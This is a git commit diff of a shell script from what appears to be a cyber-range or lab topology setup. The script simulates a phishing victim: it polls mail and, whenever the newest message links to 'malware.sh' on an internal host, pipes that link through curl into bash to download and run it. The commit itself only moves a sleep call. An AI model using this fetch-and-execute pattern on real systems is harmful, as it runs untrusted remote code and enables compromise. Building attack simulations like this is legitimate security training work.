3c2a6442d99d70f52b3f6695ec26e36dff0a0435
Jeroen van Saane <jeroen.vansaane@tno.nl>
2022-02-06 16:45:53 +0100

    Cronjobs Improved with Screens!
    Former-commit-id: ae4905bf0e6ee893c69184d1e582ae2625a7b7b4

--- roles/3_setup-topology/files/traffic-generation/retrieveMail.sh
+++ roles/3_setup-topology/files/traffic-generation/retrieveMail.sh
@@ -8,12 +8,11 @@ mail_sleep=$(bc<<<"($mail_weight*50)")
 ### retrieves mail via getmail and automatically downloads and executes the remote file from which a link was seen in the latest received email
 while :
 do
-sleep $mail_sleep
-
 getmail
 john=$(ls -Altr ~/Maildir/new | tail -1 | awk '{print $9}')
 if grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john
 then
  grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john | xargs curl | bash
 fi
+sleep $mail_sleep
 done
